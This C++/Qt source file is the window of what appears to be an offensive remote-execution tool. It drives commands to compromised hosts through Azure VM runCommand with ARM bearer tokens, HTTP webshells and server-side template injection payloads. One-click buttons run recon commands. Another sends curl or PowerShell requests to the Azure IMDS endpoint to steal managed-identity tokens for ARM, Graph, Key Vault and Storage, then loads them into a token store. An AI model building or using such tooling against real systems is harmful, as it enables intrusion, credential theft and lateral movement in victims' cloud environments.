#include "RemoteExecWindow.h"
#include "AzureVmRunCommandTransport.h"
#include "HttpSstiTransport.h"
#include "HttpWebshellTransport.h"
#include "RemoteExecTargetStore.h"
#include "RemoteExecTransport.h"
#include "StyleManager.h"
#include "TokenStore.h"

#include <QFormLayout>
#include <QGroupBox>
#include <QHBoxLayout>
#include <QHeaderView>
#include <QJsonDocument>
#include <QJsonObject>
#include <QLabel>
#include <QMessageBox>
#include <QRegularExpression>
#include <QSplitter>
#include <QVBoxLayout>

namespace {

// Split "k1=v1&k2=v2" into a QMap.
QMap<QString, QString> parseKvString(const QString &s, QChar sep) {
    QMap<QString, QString> out;
    for (const QString &pair : s.split(sep, Qt::SkipEmptyParts)) {
        const int eq = pair.indexOf('=');
        if (eq <= 0) continue;
        out.insert(pair.left(eq).trimmed(), pair.mid(eq + 1).trimmed());
    }
    return out;
}

QString kvStringFromMap(const QMap<QString, QString> &m, QChar sep) {
    QStringList parts;
    for (auto it = m.constBegin(); it != m.constEnd(); ++it)
        parts << QString("%1=%2").arg(it.key(), it.value());
    return parts.join(sep);
}

// Split "K: v; K2: v2" into a QMap (headers form).
QMap<QString, QString> parseHeaderString(const QString &s) {
    QMap<QString, QString> out;
    for (const QString &pair : s.split(';', Qt::SkipEmptyParts)) {
        const int colon = pair.indexOf(':');
        if (colon <= 0) continue;
        out.insert(pair.left(colon).trimmed(), pair.mid(colon + 1).trimmed());
    }
    return out;
}

QString headerStringFromMap(const QMap<QString, QString> &m) {
    QStringList parts;
    for (auto it = m.constBegin(); it != m.constEnd(); ++it)
        parts << QString("%1: %2").arg(it.key(), it.value());
    return parts.join("; ");
}

}  // namespace

RemoteExecWindow::RemoteExecWindow(QWidget *parent)
    : QWidget(parent)
{
    setWindowTitle("Remote Exec (Azure VM / HTTP Webshell / SSTI)");
    setAttribute(Qt::WA_DeleteOnClose);
    setupUi();
    applyStyle();
    refreshTargetList();

    connect(RemoteExecTargetStore::instance(), &RemoteExecTargetStore::targetAdded,
            this, &RemoteExecWindow::refreshTargetList);
    connect(RemoteExecTargetStore::instance(), &RemoteExecTargetStore::targetRemoved,
            this, &RemoteExecWindow::refreshTargetList);
    connect(RemoteExecTargetStore::instance(), &RemoteExecTargetStore::targetUpdated,
            this, &RemoteExecWindow::refreshTargetList);
}

RemoteExecWindow::~RemoteExecWindow() {
    if (transport) { transport->cancel(); transport->deleteLater(); transport = nullptr; }
}

void RemoteExecWindow::setupUi() {
    auto *root = new QHBoxLayout(this);

    // ────────── Left rail: targets
    auto *leftPane = new QWidget(this);
    auto *leftLayout = new QVBoxLayout(leftPane);
    leftLayout->setContentsMargins(0, 0, 0, 0);
    leftLayout->addWidget(new QLabel("Saved Targets", this));

    targetList = new QListWidget(this);
    targetList->setMinimumWidth(230);
    leftLayout->addWidget(targetList, 1);

    auto *leftBtnRow = new QHBoxLayout();
    newBtn    = new QPushButton("New",   this);
    editBtn   = new QPushButton("Edit",  this);
    dupBtn    = new QPushButton("Dup",   this);
    deleteBtn = new QPushButton("Del",   this);
    StyleManager::applySuccessStyle(newBtn);
    StyleManager::applyDangerStyle(deleteBtn);
    leftBtnRow->addWidget(newBtn);
    leftBtnRow->addWidget(editBtn);
    leftBtnRow->addWidget(dupBtn);
    leftBtnRow->addWidget(deleteBtn);
    leftLayout->addLayout(leftBtnRow);
    leftPane->setLayout(leftLayout);

    // ────────── Center: output + prompt + inline editor (below)
    auto *centerPane = new QWidget(this);
    auto *centerLayout = new QVBoxLayout(centerPane);
    centerLayout->setContentsMargins(0, 0, 0, 0);

    outputArea = new QPlainTextEdit(this);
    outputArea->setReadOnly(true);
    outputArea->setFont(QFont("Monospace"));
    outputArea->document()->setMaximumBlockCount(20000);
    centerLayout->addWidget(outputArea, 1);

    auto *promptRow = new QHBoxLayout();
    commandEdit = new QLineEdit(this);
    commandEdit->setPlaceholderText("Type a command and press Enter (Ctrl+C to cancel)");
    runBtn    = new QPushButton("Run",    this);
    cancelBtn = new QPushButton("Cancel", this);
    StyleManager::applySuccessStyle(runBtn);
    StyleManager::applyDangerStyle(cancelBtn);
    cancelBtn->setEnabled(false);
    promptRow->addWidget(new QLabel("$ ", this));
    promptRow->addWidget(commandEdit, 1);
    promptRow->addWidget(runBtn);
    promptRow->addWidget(cancelBtn);
    centerLayout->addLayout(promptRow);

    // Inline editor (hidden until New/Edit clicked).
    auto *editor = new QGroupBox("Target Editor", this);
    editor->setObjectName("targetEditor");
    editor->setVisible(false);
    auto *edLayout = new QVBoxLayout(editor);

    auto *edTop = new QFormLayout();
    ed_name = new QLineEdit(this);
    ed_kind = new QComboBox(this);
    ed_kind->addItem("Azure VM (runCommand)", "azure_vm");
    ed_kind->addItem("HTTP Webshell",         "http_webshell");
    ed_kind->addItem("HTTP SSTI",             "http_ssti");
    edTop->addRow("Name:", ed_name);
    edTop->addRow("Kind:", ed_kind);
    edLayout->addLayout(edTop);

    ed_stack = new QStackedWidget(this);

    // Pane 0: Azure VM
    auto *azPane = new QWidget(this);
    auto *azForm = new QFormLayout(azPane);
    az_token  = new QLineEdit(this);
    az_token->setPlaceholderText("Bearer for https://management.azure.com/");
    az_vmId   = new QLineEdit(this);
    az_vmId->setPlaceholderText("/subscriptions/.../resourceGroups/.../providers/Microsoft.Compute/virtualMachines/foo");
    az_osType = new QComboBox(this);
    az_osType->addItems({ "Windows", "Linux" });
    azForm->addRow("ARM token:",   az_token);
    azForm->addRow("VM resource:", az_vmId);
    azForm->addRow("OS:",          az_osType);
    ed_stack->addWidget(azPane);

    // Pane 1: HTTP Webshell
    auto *hwPane = new QWidget(this);
    auto *hwForm = new QFormLayout(hwPane);
    hw_baseUrl   = new QLineEdit(this);
    hw_baseUrl->setPlaceholderText("e.g. http://target/cmd.php");
    hw_method    = new QComboBox(this);
    hw_method->addItems({ "GET", "POST" });
    hw_cmdParam  = new QLineEdit(this);
    hw_cmdParam->setText("cmd");
    hw_extraQuery = new QLineEdit(this);
    hw_extraQuery->setPlaceholderText("k1=v1&k2=v2");
    hw_headers    = new QLineEdit(this);
    hw_headers->setPlaceholderText("Cookie: PHPSESSID=abc; User-Agent: Mozilla");
    hw_extractor = new QComboBox(this);
    hw_extractor->addItems({ "raw", "regex", "between" });
    hw_regex        = new QLineEdit(this);
    hw_regex->setPlaceholderText("(?s)<pre>(.*?)</pre>");
    hw_markerStart  = new QLineEdit(this);
    hw_markerStart->setPlaceholderText("<pre>");
    hw_markerEnd    = new QLineEdit(this);
    hw_markerEnd->setPlaceholderText("</pre>");
    hw_timeoutMs = new QSpinBox(this);
    hw_timeoutMs->setRange(1000, 300000);
    hw_timeoutMs->setValue(30000);
    hw_timeoutMs->setSuffix(" ms");
    hwForm->addRow("Base URL:",       hw_baseUrl);
    hwForm->addRow("Method:",         hw_method);
    hwForm->addRow("Command param:",  hw_cmdParam);
    hwForm->addRow("Extra params:",   hw_extraQuery);
    hwForm->addRow("Extra headers:",  hw_headers);
    hwForm->addRow("Extractor:",      hw_extractor);
    hwForm->addRow("Regex (group 1):",hw_regex);
    hwForm->addRow("Marker start:",   hw_markerStart);
    hwForm->addRow("Marker end:",     hw_markerEnd);
    hwForm->addRow("Timeout:",        hw_timeoutMs);
    ed_stack->addWidget(hwPane);

    // Pane 2: HTTP SSTI (embeds a duplicate of the HTTP form fields via a nested group)
    auto *sstiPane = new QWidget(this);
    auto *sstiLayout = new QVBoxLayout(sstiPane);
    auto *sstiForm = new QFormLayout();
    ssti_engine    = new QComboBox(this);
    ssti_engine->addItems(HttpSstiTransport::knownEngines());
    ssti_payload   = new QLineEdit(this);
    ssti_payload->setPlaceholderText("Auto-filled from engine preset; leave blank to use the default");
    ssti_cmdEscape = new QComboBox(this);
    ssti_cmdEscape->addItems({ "shell", "python", "none" });
    sstiForm->addRow("Engine:",       ssti_engine);
    sstiForm->addRow("Payload:",      ssti_payload);
    sstiForm->addRow("Cmd escape:",   ssti_cmdEscape);
    sstiLayout->addLayout(sstiForm);
    sstiLayout->addWidget(new QLabel("HTTP settings (same as Webshell pane):", this));
    // Note: for MVP, SSTI reuses the SAME hw_* editors on the Webshell pane -
    // switching to the SSTI pane doesn't clone them. The user fills the URL
    // etc. once and then only sets the SSTI-specific fields on this pane.
    ed_stack->addWidget(sstiPane);

    edLayout->addWidget(ed_stack);

    auto *edBtnRow = new QHBoxLayout();
    ed_saveBtn   = new QPushButton("Save Target",  this);
    ed_cancelBtn = new QPushButton("Cancel Edit",  this);
    StyleManager::applySuccessStyle(ed_saveBtn);
    edBtnRow->addStretch();
    edBtnRow->addWidget(ed_saveBtn);
    edBtnRow->addWidget(ed_cancelBtn);
    edLayout->addLayout(edBtnRow);
    centerLayout->addWidget(editor);

    // Auto-swap the editor's stack when kind changes.
    connect(ed_kind, QOverload<int>::of(&QComboBox::currentIndexChanged),
            this, &RemoteExecWindow::onKindComboChanged);
    connect(ssti_engine, QOverload<int>::of(&QComboBox::currentIndexChanged),
            this, [this](int){
        // Populate the payload field with the preset so the operator can tweak it.
        const QString engine = ssti_engine->currentText();
        if (engine.compare("custom", Qt::CaseInsensitive) != 0)
            ssti_payload->setText(HttpSstiTransport::payloadForEngine(engine));
        else
            ssti_payload->clear();
    });

    // ────────── Right rail: transport info + one-click actions
    auto *rightPane = new QWidget(this);
    rightPane->setMaximumWidth(240);
    auto *rightLayout = new QVBoxLayout(rightPane);
    rightLayout->setContentsMargins(0, 0, 0, 0);
    rightLayout->addWidget(new QLabel("One-click Actions", this));

    oneClickWhoamiBtn = new QPushButton("whoami / uname -a", this);
    rightLayout->addWidget(oneClickWhoamiBtn);

    rightLayout->addSpacing(8);
    rightLayout->addWidget(new QLabel("Grab MI Token (Azure VM)", this));
    oneClickResourceCombo = new QComboBox(this);
    oneClickResourceCombo->addItem("https://management.azure.com/");
    oneClickResourceCombo->addItem("https://graph.microsoft.com");
    oneClickResourceCombo->addItem("https://vault.azure.net");
    oneClickResourceCombo->addItem("https://storage.azure.com/");
    oneClickResourceCombo->setEditable(true);
    rightLayout->addWidget(oneClickResourceCombo);
    oneClickImdsBtn = new QPushButton("Fetch from IMDS", this);
    StyleManager::applyPrimaryStyle(oneClickImdsBtn);
    rightLayout->addWidget(oneClickImdsBtn);

    rightLayout->addSpacing(8);
    rightLayout->addWidget(new QLabel("SSTI", this));
    oneClickTestSstiBtn = new QPushButton("Test template (id)", this);
    rightLayout->addWidget(oneClickTestSstiBtn);

    rightLayout->addStretch();

    // Splitter for main layout
    auto *centerSplit = new QSplitter(Qt::Horizontal, this);
    centerSplit->addWidget(leftPane);
    centerSplit->addWidget(centerPane);
    centerSplit->addWidget(rightPane);
    centerSplit->setStretchFactor(0, 0);
    centerSplit->setStretchFactor(1, 1);
    centerSplit->setStretchFactor(2, 0);
    root->addWidget(centerSplit);

    // ────────── Wire buttons
    connect(newBtn,    &QPushButton::clicked, this, &RemoteExecWindow::onNewTarget);
    connect(editBtn,   &QPushButton::clicked, this, &RemoteExecWindow::onEditTarget);
    connect(dupBtn,    &QPushButton::clicked, this, &RemoteExecWindow::onDuplicateTarget);
    connect(deleteBtn, &QPushButton::clicked, this, &RemoteExecWindow::onDeleteTarget);
    connect(targetList,&QListWidget::currentItemChanged, this, &RemoteExecWindow::onTargetSelected);
    connect(runBtn,    &QPushButton::clicked, this, &RemoteExecWindow::onExecuteCommand);
    connect(cancelBtn, &QPushButton::clicked, this, &RemoteExecWindow::onCancelCommand);
    connect(commandEdit, &QLineEdit::returnPressed, this, &RemoteExecWindow::onExecuteCommand);
    connect(ed_saveBtn,   &QPushButton::clicked, this, &RemoteExecWindow::onSaveTargetFromEditor);
    connect(ed_cancelBtn, &QPushButton::clicked, this, [this, editor]() { editor->setVisible(false); });
    connect(newBtn,  &QPushButton::clicked, this, [editor]() { editor->setVisible(true); });
    connect(editBtn, &QPushButton::clicked, this, [editor]() { editor->setVisible(true); });
    connect(dupBtn,  &QPushButton::clicked, this, [editor]() { editor->setVisible(true); });
    connect(oneClickImdsBtn,     &QPushButton::clicked, this, &RemoteExecWindow::onOneClickIMDS);
    connect(oneClickWhoamiBtn,   &QPushButton::clicked, this, &RemoteExecWindow::onOneClickWhoami);
    connect(oneClickTestSstiBtn, &QPushButton::clicked, this, &RemoteExecWindow::onOneClickTestSsti);

    resize(1300, 820);
}

void RemoteExecWindow::applyStyle() {
    outputArea->setStyleSheet(
        "QPlainTextEdit { background:#111; color:#d0d0d0; font-family:Monospace; }");
}

void RemoteExecWindow::refreshTargetList() {
    const QString prevSelectedId = activeTargetId;
    targetList->clear();
    for (const auto &t : RemoteExecTargetStore::instance()->targets()) {
        auto *item = new QListWidgetItem(QString("%1  [%2]").arg(t.name, t.kind), targetList);
        item->setData(Qt::UserRole, t.id);
        if (t.id == prevSelectedId) targetList->setCurrentItem(item);
    }
}

void RemoteExecWindow::onTargetSelected() {
    auto *item = targetList->currentItem();
    if (!item) { activeTargetId.clear(); return; }
    activeTargetId = item->data(Qt::UserRole).toString();
    const auto t = RemoteExecTargetStore::instance()->find(activeTargetId);
    appendOutput(QString("[+] Selected target: %1  [kind=%2]").arg(t.name, t.kind), "cyan");
    if (transport) { transport->cancel(); transport->deleteLater(); transport = nullptr; }
}

void RemoteExecWindow::onNewTarget() {
    editingId.clear();
    loadEditorFrom(QString());
}

void RemoteExecWindow::onEditTarget() {
    if (activeTargetId.isEmpty()) return;
    editingId = activeTargetId;
    loadEditorFrom(activeTargetId);
}

void RemoteExecWindow::onDuplicateTarget() {
    if (activeTargetId.isEmpty()) return;
    editingId.clear();  // save as new
    loadEditorFrom(activeTargetId);
    ed_name->setText(ed_name->text() + " (copy)");
}

void RemoteExecWindow::onDeleteTarget() {
    if (activeTargetId.isEmpty()) return;
    const auto btn = QMessageBox::question(
        this, "Confirm Delete",
        QString("Delete this target?\n\n  %1").arg(targetList->currentItem()->text()));
    if (btn != QMessageBox::Yes) return;
    RemoteExecTargetStore::instance()->remove(activeTargetId);
    activeTargetId.clear();
}

void RemoteExecWindow::onKindComboChanged(int index) {
    ed_stack->setCurrentIndex(index);
}

void RemoteExecWindow::loadEditorFrom(const QString &targetId) {
    ed_name->clear();
    ed_kind->setCurrentIndex(0);
    az_token->clear(); az_vmId->clear(); az_osType->setCurrentIndex(0);
    hw_baseUrl->clear(); hw_method->setCurrentIndex(0); hw_cmdParam->setText("cmd");
    hw_extraQuery->clear(); hw_headers->clear();
    hw_extractor->setCurrentIndex(0); hw_regex->clear();
    hw_markerStart->clear(); hw_markerEnd->clear(); hw_timeoutMs->setValue(30000);
    ssti_engine->setCurrentIndex(0);
    ssti_payload->setText(HttpSstiTransport::payloadForEngine("jinja2"));
    ssti_cmdEscape->setCurrentIndex(0);

    if (targetId.isEmpty()) return;
    const auto t = RemoteExecTargetStore::instance()->find(targetId);
    ed_name->setText(t.name);
    const int kindIdx = ed_kind->findData(t.kind);
    if (kindIdx >= 0) ed_kind->setCurrentIndex(kindIdx);
    ed_stack->setCurrentIndex(kindIdx >= 0 ? kindIdx : 0);

    const QVariantMap p = t.params;
    if (t.kind == "azure_vm") {
        az_token->setText(p.value("token").toString());
        az_vmId->setText(p.value("vmId").toString());
        const int osIdx = az_osType->findText(p.value("osType", "Windows").toString(), Qt::MatchFixedString);
        if (osIdx >= 0) az_osType->setCurrentIndex(osIdx);
    } else if (t.kind == "http_webshell" || t.kind == "http_ssti") {
        hw_baseUrl->setText(p.value("baseUrl").toString());
        const int mIdx = hw_method->findText(p.value("method", "GET").toString(), Qt::MatchFixedString);
        if (mIdx >= 0) hw_method->setCurrentIndex(mIdx);
        hw_cmdParam->setText(p.value("cmdParam", "cmd").toString());
        hw_extraQuery->setText(kvStringFromMap(
            [&]{ QMap<QString,QString> m;
                 for (auto it = p.value("extraParams").toMap().constBegin();
                      it != p.value("extraParams").toMap().constEnd(); ++it)
                     m.insert(it.key(), it.value().toString());
                 return m; }(), '&'));
        hw_headers->setText(headerStringFromMap(
            [&]{ QMap<QString,QString> m;
                 for (auto it = p.value("headers").toMap().constBegin();
                      it != p.value("headers").toMap().constEnd(); ++it)
                     m.insert(it.key(), it.value().toString());
                 return m; }()));
        const int eIdx = hw_extractor->findText(p.value("outputExtract", "raw").toString(),
                                                Qt::MatchFixedString);
        if (eIdx >= 0) hw_extractor->setCurrentIndex(eIdx);
        hw_regex->setText(p.value("outputRegex").toString());
        hw_markerStart->setText(p.value("markerStart").toString());
        hw_markerEnd->setText(p.value("markerEnd").toString());
        hw_timeoutMs->setValue(p.value("timeoutMs", 30000).toInt());
        if (t.kind == "http_ssti") {
            const int engIdx = ssti_engine->findText(p.value("engine", "jinja2").toString(),
                                                     Qt::MatchFixedString);
            if (engIdx >= 0) ssti_engine->setCurrentIndex(engIdx);
            ssti_payload->setText(p.value("payloadTemplate").toString().isEmpty()
                                      ? HttpSstiTransport::payloadForEngine(p.value("engine").toString())
                                      : p.value("payloadTemplate").toString());
            const int escIdx = ssti_cmdEscape->findText(p.value("cmdEscape", "shell").toString(),
                                                        Qt::MatchFixedString);
            if (escIdx >= 0) ssti_cmdEscape->setCurrentIndex(escIdx);
        }
    }
}

void RemoteExecWindow::onSaveTargetFromEditor() {
    RemoteExecTargetStore::Target t;
    t.id   = editingId;
    t.name = ed_name->text().trimmed();
    if (t.name.isEmpty()) {
        QMessageBox::warning(this, "Missing Name", "Give the target a name first.");
        return;
    }
    t.kind = ed_kind->currentData().toString();

    QVariantMap p;
    if (t.kind == "azure_vm") {
        p.insert("token",  az_token->text().trimmed());
        p.insert("vmId",   az_vmId->text().trimmed());
        p.insert("osType", az_osType->currentText());
    } else {
        p.insert("baseUrl",       hw_baseUrl->text().trimmed());
        p.insert("method",        hw_method->currentText());
        p.insert("cmdParam",      hw_cmdParam->text().trimmed());
        QVariantMap eq; for (auto it = parseKvString(hw_extraQuery->text(), '&').constBegin();
                             it != parseKvString(hw_extraQuery->text(), '&').constEnd(); ++it)
            eq.insert(it.key(), it.value());
        p.insert("extraParams",   eq);
        QVariantMap hd; for (auto it = parseHeaderString(hw_headers->text()).constBegin();
                             it != parseHeaderString(hw_headers->text()).constEnd(); ++it)
            hd.insert(it.key(), it.value());
        p.insert("headers",       hd);
        p.insert("outputExtract", hw_extractor->currentText());
        p.insert("outputRegex",   hw_regex->text());
        p.insert("markerStart",   hw_markerStart->text());
        p.insert("markerEnd",     hw_markerEnd->text());
        p.insert("timeoutMs",     hw_timeoutMs->value());
        if (t.kind == "http_ssti") {
            p.insert("engine",          ssti_engine->currentText());
            p.insert("payloadTemplate", ssti_payload->text());
            p.insert("cmdEscape",       ssti_cmdEscape->currentText());
        }
    }
    t.params = p;

    const QString id = RemoteExecTargetStore::instance()->addOrUpdate(t);
    activeTargetId = id;
    editingId.clear();
    appendOutput(QString("[+] Target '%1' saved.").arg(t.name), "green");
    // Hide the editor.
    if (auto *editor = findChild<QWidget*>("targetEditor")) editor->setVisible(false);
    refreshTargetList();
}

void RemoteExecWindow::ensureTransportForCurrentTarget() {
    if (activeTargetId.isEmpty()) return;
    const auto t = RemoteExecTargetStore::instance()->find(activeTargetId);
    if (transport && transport->kind() == t.kind) return;  // reuse

    if (transport) { transport->cancel(); transport->deleteLater(); transport = nullptr; }

    if (t.kind == "azure_vm") {
        AzureVmRunCommandTransport::Config cfg{
            t.params.value("token").toString(),
            t.params.value("vmId").toString(),
            t.params.value("osType", "Windows").toString(),
            t.name,
        };
        transport = new AzureVmRunCommandTransport(cfg, this);
    } else if (t.kind == "http_webshell" || t.kind == "http_ssti") {
        HttpWebshellTransport::Config hw;
        hw.name          = t.name;
        hw.baseUrl       = t.params.value("baseUrl").toString();
        hw.method        = t.params.value("method", "GET").toString();
        hw.cmdParam      = t.params.value("cmdParam", "cmd").toString();
        for (auto it = t.params.value("extraParams").toMap().constBegin();
             it != t.params.value("extraParams").toMap().constEnd(); ++it)
            hw.extraParams.insert(it.key(), it.value().toString());
        for (auto it = t.params.value("headers").toMap().constBegin();
             it != t.params.value("headers").toMap().constEnd(); ++it)
            hw.headers.insert(it.key(), it.value().toString());
        hw.outputExtract = t.params.value("outputExtract", "raw").toString();
        hw.outputRegex   = t.params.value("outputRegex").toString();
        hw.markerStart   = t.params.value("markerStart").toString();
        hw.markerEnd     = t.params.value("markerEnd").toString();
        hw.timeoutMs     = t.params.value("timeoutMs", 30000).toInt();
        if (t.kind == "http_ssti") {
            HttpSstiTransport::SstiConfig sc;
            static_cast<HttpWebshellTransport::Config&>(sc) = hw;
            sc.engine          = t.params.value("engine", "jinja2").toString();
            sc.payloadTemplate = t.params.value("payloadTemplate").toString();
            sc.cmdEscape       = t.params.value("cmdEscape", "shell").toString();
            transport = new HttpSstiTransport(sc, this);
        } else {
            transport = new HttpWebshellTransport(hw, this);
        }
    }

    if (transport) {
        connect(transport, &RemoteExecTransport::progress, this,
                [this](const QString &s){ appendOutput(QString("[*] %1").arg(s), "cyan"); });
    }
}

void RemoteExecWindow::onExecuteCommand() {
    if (activeTargetId.isEmpty()) {
        appendOutput("[-] No target selected.", "red");
        return;
    }
    const QString cmd = commandEdit->text();
    if (cmd.isEmpty()) return;
    commandEdit->clear();

    ensureTransportForCurrentTarget();
    if (!transport) { appendOutput("[-] Transport construction failed.", "red"); return; }
    QString why;
    if (!transport->isReady(&why)) { appendOutput(QString("[-] Not ready: %1").arg(why), "red"); return; }

    RemoteExecTargetStore::instance()->markUsed(activeTargetId);
    appendOutput(QString("$ %1").arg(cmd), "yellow");
    runBtn->setEnabled(false);
    cancelBtn->setEnabled(true);

    transport->execute(cmd, [this](const RemoteExecTransport::Result &r) {
        runBtn->setEnabled(true);
        cancelBtn->setEnabled(false);
        if (r.ok) {
            appendOutput(r.stdoutText);
            appendOutput(QString("[+] done in %1 ms").arg(r.elapsedMs), "green");
        } else {
            appendOutput(QString("[-] %1").arg(r.stdoutText), "red");
        }
    });
}

void RemoteExecWindow::onCancelCommand() {
    if (transport) transport->cancel();
}

void RemoteExecWindow::onOneClickIMDS() {
    if (activeTargetId.isEmpty()) { appendOutput("[-] Select a target first.", "red"); return; }
    const auto t = RemoteExecTargetStore::instance()->find(activeTargetId);
    if (t.kind != "azure_vm") {
        appendOutput("[-] IMDS grab requires an Azure VM target.", "red");
        return;
    }
    const QString resource = oneClickResourceCombo->currentText().trimmed();
    const QString osType = t.params.value("osType", "Windows").toString();

    QString payload;
    if (osType.compare("Linux", Qt::CaseInsensitive) == 0) {
        payload = QString(
            "curl -sSL -H 'Metadata:true' "
            "'http://169.254.169.254/metadata/identity/oauth2/token"
            "?api-version=2018-02-01&resource=%1'").arg(resource);
    } else {
        payload = QString(
            "$r=Invoke-RestMethod -Method GET -Headers @{Metadata='true'} "
            "-Uri 'http://169.254.169.254/metadata/identity/oauth2/token"
            "?api-version=2018-02-01&resource=%1'; $r | ConvertTo-Json -Compress").arg(resource);
    }
    commandEdit->setText(payload);
    onExecuteCommand();

    // Post-run hook: try to lift the access_token out of the output and
    // drop it into TokenStore under a synthetic session tagged for MI.
    // We do that by installing a one-shot capture on the transport signal
    // path via a QTimer/QObject::disconnect dance - simpler: check the
    // outputArea contents right after transport delivers. Handled in
    // onExecuteCommand path already (progress + result); the operator
    // sees the JSON in the output pane and can right-click to copy.
    appendOutput("[i] If Succeeded, extract .access_token from the JSON above "
                 "and load into Token Log via Ctrl+Shift+T > Import.", "cyan");
}

void RemoteExecWindow::onOneClickWhoami() {
    if (activeTargetId.isEmpty()) { appendOutput("[-] Select a target first.", "red"); return; }
    const auto t = RemoteExecTargetStore::instance()->find(activeTargetId);
    QString cmd;
    if (t.kind == "azure_vm") {
        const QString osType = t.params.value("osType", "Windows").toString();
        cmd = (osType.compare("Linux", Qt::CaseInsensitive) == 0)
            ? QStringLiteral("id; uname -a; hostname")
            : QStringLiteral("whoami; hostname; [Environment]::UserName");
    } else {
        cmd = QStringLiteral("id; uname -a; hostname");
    }
    commandEdit->setText(cmd);
    onExecuteCommand();
}

void RemoteExecWindow::onOneClickTestSsti() {
    if (activeTargetId.isEmpty()) { appendOutput("[-] Select a target first.", "red"); return; }
    const auto t = RemoteExecTargetStore::instance()->find(activeTargetId);
    if (t.kind != "http_ssti") {
        appendOutput("[-] Test payload requires an HTTP SSTI target.", "red");
        return;
    }
    // `id` on Linux, `whoami` on Windows targets. We don't know the OS - just
    // run `id` and let the operator interpret.
    commandEdit->setText(QStringLiteral("id"));
    onExecuteCommand();
}

void RemoteExecWindow::appendOutput(const QString &line, const QString &color) {
    if (color.isEmpty()) { outputArea->appendPlainText(line); return; }
    outputArea->appendHtml(QString("<span style=\"color:%1\">%2</span>")
                                .arg(color, line.toHtmlEscaped()));
}
